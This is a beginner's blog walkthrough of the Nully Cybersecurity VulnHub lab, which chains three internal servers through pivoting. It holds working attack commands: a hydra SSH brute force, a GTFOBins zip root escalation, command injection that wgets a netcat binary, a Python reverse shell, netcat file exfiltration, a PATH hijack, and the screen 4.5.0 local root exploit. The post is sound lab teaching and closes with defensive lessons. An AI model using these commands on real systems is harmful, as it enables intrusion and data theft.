---
layout: post
title: "Nully Cybersecurity (VulnHub) — a beginner's walkthrough"
date: 2026-03-08
author: Nguyen Nam Khanh
tags: [vulnhub, walkthrough, pentest, privilege-escalation, pivoting]
description: >
  A full, beginner-friendly walkthrough of the Nully Cybersecurity VulnHub
  machine: from an unauthenticated port scan to root on three separate
  servers, pivoting through an internal Docker network along the way.
---

> **Lab use only.** Everything below is done against *Nully Cybersecurity: 1*,
> a deliberately vulnerable virtual machine running on my own isolated
> network. Never run these techniques against systems you do not own or do
> not have written permission to test.

If you are just getting into penetration testing, a "boot-to-root" machine is
one of the best ways to learn: you start with nothing but an IP address and
work your way up to full administrator (`root`) access. This box is a great
one to start with because it is not a single puzzle — it is **three** machines
chained together, and you have to *pivot* from one to the next.

By the end you will have touched almost every stage of a real engagement:
recon, reading a mail server, password cracking, command injection, reverse
shells, network pivoting, and four or five different privilege-escalation
tricks.

---

## Reproduce this at home

You can download the exact machine and follow along step by step.

| | |
|---|---|
| **Machine** | Nully Cybersecurity: 1 |
| **Author** | laf3r |
| **Source** | [VulnHub entry](https://www.vulnhub.com/entry/nully-cybersecurity-1,549/) |
| **Released** | 6 September 2020 |
| **Difficulty** | Easy–intermediate |
| **Format** | VirtualBox OVA (~1.4 GB), `NullyCybersecurityCTF.zip` |

**Setup I used:**

1. Download the OVA from the VulnHub page and import it into **VirtualBox**
   (the author notes it behaves better on VirtualBox than VMware). Verify the
   download against the MD5/SHA1 checksums listed on the VulnHub page before
   importing.
2. Put the target on a **Host-Only** adapter so it can only talk to your
   attacker VM, never the internet. This keeps the lab safe and your scan
   results clean.
3. Run a Kali (or any Linux) attacker VM on the same host-only network.

> Throughout this write-up the target first appears at `192.168.1.46`. Your IP
> will differ — substitute your own everywhere you see it. (This box was built
> in two sittings, so a couple of internal IPs shift partway through; I call
> that out where it happens.)

---

## Flag 1 — The mail server

### Find the target

We do not know the machine's IP yet, so we sweep the local network with
`netdiscover`, which sends ARP requests and lists every host that answers:

```bash
netdiscover -i eth1 -r 192.168.1.0/24
```

One host stands out at `192.168.1.46`, and its MAC address belongs to
*PCS Systemtechnik GmbH* — the vendor ID VirtualBox uses. That is our box.

### Scan it

`nmap` tells us which services are running. `-sC` runs safe default scripts,
`-sV` grabs version banners, `-v` is verbose:

```bash
nmap -sC -sV 192.168.1.46 -v
```

![nmap results showing five open ports]({{ '/images/nully-cybersecurity/01-nmap.png' | relative_url }})

Five ports are open:

| Port | Service |
|---|---|
| 80 | HTTP (web) |
| 110 | POP3 (email) |
| 2222 | SSH |
| 8000 | HTTP (another web app) |
| 9000 | (used later) |

The website on port 80 hints that only **POP3 (110)** and **SSH (2222)** are
meant to be attacked from the outside, and it hands us a set of mailbox
credentials.

### Read the mail over POP3

POP3 is an old, plain-text email protocol — we can talk to it by hand with
`telnet`. `USER` and `PASS` log in, `LIST` shows waiting messages, and
`RETR 1` reads the first one:

```bash
telnet 192.168.1.46 110
USER pentester
PASS qKnGByeaeQJWTjj2efHxst7Hu0xHADGO
LIST
RETR 1
```

![Reading Bob's email over POP3]({{ '/images/nully-cybersecurity/02-pop3-mail.png' | relative_url }})

There is one message, from the mail-server admin **Bob Smith**, and he admits
his password is very simple. That is a strong hint: admins often reuse their
name, and a weak password invites brute force.

### Brute-force SSH as Bob

We build a small wordlist of names related to Bob (`username.txt`) and let
`hydra` try each entry as both the username and the password against SSH on
port 2222. `-f` stops at the first success:

```bash
hydra -L username.txt -P username.txt -f ssh://192.168.1.46:2222
```

It lands on **`bob` / `bobby1985`**.

![hydra finds bob's SSH password]({{ '/images/nully-cybersecurity/03-hydra-ssh.png' | relative_url }})

```bash
ssh bob@192.168.1.46 -p 2222
```

### From Bob to root

The first thing to check after landing on any Linux box is what the user is
allowed to run as someone else:

```bash
sudo -l
```

Bob can run `/opt/scripts/check.sh` as the user `my2user`. That script is
writable, so we append a line that launches a shell (`/bin/bash`) and run it —
a classic step sideways into another account:

```bash
sudo -u my2user /bin/bash /opt/scripts/check.sh
```

![Shell as my2user]({{ '/images/nully-cybersecurity/04-shell-my2user.png' | relative_url }})

Now as `my2user`, we check `sudo -l` again. This user can run **`zip` as root
without a password**. `zip` is on [GTFOBins](https://gtfobins.github.io/gtfobins/zip/#sudo),
which documents how everyday binaries can be abused. The trick:

```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
```

Why this works, in plain terms:

- `zip` is allowed to run as **root**, so anything it launches also runs as root.
- `-T` tells `zip` to *test* the archive after creating it.
- `-TT 'sh #'` replaces the normal test command with **our own** command.
  `zip` runs `sh` (a root shell) and the `#` comments out the rest of the line.

We now have a **root shell on the mail server**, and Flag 1.

---

## Flag 2 — Pivoting to the web server

Root on one machine is rarely the whole story. This box lives inside an
internal Docker network (`172.17.0.0/16`) that we can only see *from* the mail
server. Reaching those hidden machines is called **pivoting**. First we drop an
SSH key on the mail server as a stable backdoor, then explore.

### Map the internal network

From the mail server we scan the internal range with `netdiscover`:

```bash
netdiscover -i eth0 -r 172.17.0.0/16
```

`172.17.0.1` is the gateway. Probing the others:

- `172.17.0.3` has port **80** open → a **web server** (confirmed with `curl`).
- `172.17.0.2` has port **21** open → an FTP **file server** (used in Flag 3).

### Tunnel the hidden web app to our machine

Our attacker laptop cannot reach `172.17.0.x` directly, so we build an **SSH
tunnel** (local port forward) through the mail server. This makes the remote
web server show up as `localhost:8000` on our own machine:

```bash
ssh -L 8000:172.17.0.3:80 root@192.168.1.46 -p 2222 -i id_rsa
```

![Local port forward established]({{ '/images/nully-cybersecurity/05-ssh-tunnel.png' | relative_url }})

Now `http://localhost:8000` *is* the internal web server.

### Find the vulnerable page

`dirb` brute-forces common file and directory names to find hidden pages:

```bash
dirb http://localhost:8000
```

It reveals a listable `/ping/` directory containing `ping.php`. A note on the
page says to use a `host` parameter, and it runs that value without validating
it:

```
http://localhost:8000/ping/ping.php?host=172.17.0.1
```

![ping.php reflects command output — command injection]({{ '/images/nully-cybersecurity/06-ping-command-injection.png' | relative_url }})

That is a textbook **OS command injection**: whatever we append after a `;`
gets executed on the server.

### Get a shell as www-data

First we stage a `netcat` binary onto the target through the injection (the box
cannot install packages as the low-privileged web user, so we `wget` a copy we
host ourselves):

```
http://localhost:8000/ping/ping.php?host=; wget http://172.17.0.5:9000/nc
http://localhost:8000/ping/ping.php?host=; chmod 777 nc
```

The `nc` reverse shell did not fire (this build lacks the `-e` option), so we
fall back to a Python one-liner. It connects **back to a listener we run on the
mail server** — our pivot box — at `172.17.0.5:9000`:

```python
python3 -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("172.17.0.5",9000));
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
subprocess.call(["/bin/sh","-i"])'
```

What each part does: create a network socket, connect it back to our listener,
wire the shell's input/output/errors (`0`,`1`,`2`) into that socket, then
launch an interactive shell.

> **IP note:** after a VM reboot the internal addresses shifted — at this point
> `172.17.0.5` is the mail server (our listener), `172.17.0.2` is the file
> server, and `172.17.0.3` is the web server. Adjust to whatever your own
> `netdiscover` shows.

![Reverse shell as www-data]({{ '/images/nully-cybersecurity/07-reverse-shell.png' | relative_url }})

We land as the low-privileged **`www-data`**.

### Two users, two escalations

Hunting for files owned by the interesting users turns up two leads:

```bash
find / -type f -user 1000 2>/dev/null   # Oscar
find / -type f -user 1001 2>/dev/null   # Oliver
```

- **Oliver** left a `.secret` backup file containing his password
  (`4hppfvhb9pW4E4OrbMLwPETRgVo2KyyDTqGF`). We log in as Oliver.
- **Oscar** owns a **SUID** `python3` (a program that always runs as its owner).
  Running it with the privileged flag keeps Oscar's identity instead of
  dropping it:

  ```bash
  python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
  ```

  (`-p` = privileged mode: do not drop the elevated rights.) From Oscar's home
  we recover his password (`H53QfJcXNcur9xFGND3bkPlVlMYUrPyBp76o`) and SSH in
  as Oscar properly.

### Root via a PATH hijack

In Oscar's home there is a `/scripts` folder with a SUID-root program called
`current-date`. **SUID-root** means it always runs as root, no matter who
starts it. We inspect its strings:

```bash
strings current-date
```

![strings output of current-date]({{ '/images/nully-cybersecurity/08-strings-current-date.png' | relative_url }})

It calls `date` **without a full path** (not `/bin/date`). That means the
system searches the folders in `$PATH` to find `date` — and we control `$PATH`.
So we plant a fake `date` that opens a *root-preserving* shell, put its folder
first in `$PATH`, and run `current-date`:

```bash
cd /tmp
printf '#!/bin/bash\n/bin/bash -p\n' > date
chmod +x date
export PATH=/tmp:$PATH
current-date
```

The `-p` matters: a normal `bash` drops SUID privileges on launch, so without
it you would fall back to your own user. With `-p`, the shell keeps the root
rights it inherited from the SUID `current-date`.

> The original report performed exactly this PATH-hijack but kept the precise
> commands in screenshots; the block above is the standard, working form of
> that technique.

![Root on the web server — 2_flag.txt]({{ '/images/nully-cybersecurity/09-root-web-server.png' | relative_url }})

We now own the **web server**, and `2_flag.txt` is ours.

---

## Flag 3 — The file server and the database server

### Loot the file server over anonymous FTP

From the web server we can reach the **file server** at `172.17.0.2`, which
allows **anonymous FTP** — log in with the username `anonymous` and no
password:

![Anonymous FTP enabled]({{ '/images/nully-cybersecurity/10-anonymous-ftp.png' | relative_url }})

Inside are `file.txt` (nothing useful) and `backup.zip`. We move the archive
back to our own machine with `netcat` so it is easier to work on:

```bash
# on the remote server
nc -w 3 192.168.18.145 8888 < backup.zip
# on our machine
nc -lvnp 8888 > backup.zip
```

### Crack the archive password

The zip is encrypted. `zip2john` turns it into a hash that `john`
(John the Ripper) can crack:

```bash
zip2john backup.zip > zip.hash
john zip.hash
```

The password is **`1234567890`**.

![john cracks the zip password]({{ '/images/nully-cybersecurity/11-john-zip-crack.png' | relative_url }})

Inside we find credentials for a user, **donald**, who has access to the
**database server**. We SSH to it from the web server.

### Root via the `screen` exploit

On the database server, `linpeas` (an automated privilege-escalation scanner)
flags a SUID binary: **`screen-4.5.0`**. That exact version has a well-known
local root exploit, [Exploit-DB 41154](https://www.exploit-db.com/raw/41154).

In short: `screen` runs as root, and this version mishandles its log-file
option, so it can be tricked into loading an attacker-supplied shared library
as root. The published exploit is a self-contained shell script — it writes and
compiles two small helper files (a library and a tiny root-shell program), then
launches `screen` so the library loads with root privileges:

```bash
# save Exploit-DB 41154 as 41154.sh, then:
chmod +x 41154.sh
./41154.sh
# -> drops you into a root shell
```

![Root on the database server]({{ '/images/nully-cybersecurity/12-root-db-server.png' | relative_url }})

That gives us **root on the database server** and the final flag. All three
servers owned.

---

## What this box teaches

If you are writing this up for a portfolio, the value is not the flags — it is
showing you understand *why* each step worked and how a defender stops it:

- **Reused / guessable passwords** (`bobby1985`) → enforce strong, unique
  passwords and rate-limit SSH.
- **Writable scripts run via `sudo`** → never let a user edit a script they can
  run as someone else.
- **GTFOBins binaries in `sudoers`** (`zip`) → grant the narrowest possible
  `sudo` rights, and check every allowed binary against GTFOBins.
- **Unvalidated input passed to the shell** (`ping.php`) → never build shell
  commands from user input; use safe APIs and allow-lists.
- **SUID programs that call binaries by name, not full path** (`current-date`)
  → always use absolute paths and reset `$PATH` in privileged programs.
- **Anonymous FTP + weak zip password** → disable anonymous access and treat
  "backup" files as crown jewels.
- **Outdated SUID software** (`screen 4.5.0`) → patch, and remove the SUID bit
  where it is not needed.

A single weak password at the edge turned into full control of an entire
internal network — because each machine trusted the one before it.

---

*Written by **Nguyen Nam Khanh** ([@Khanh1916](https://github.com/Khanh1916)).*
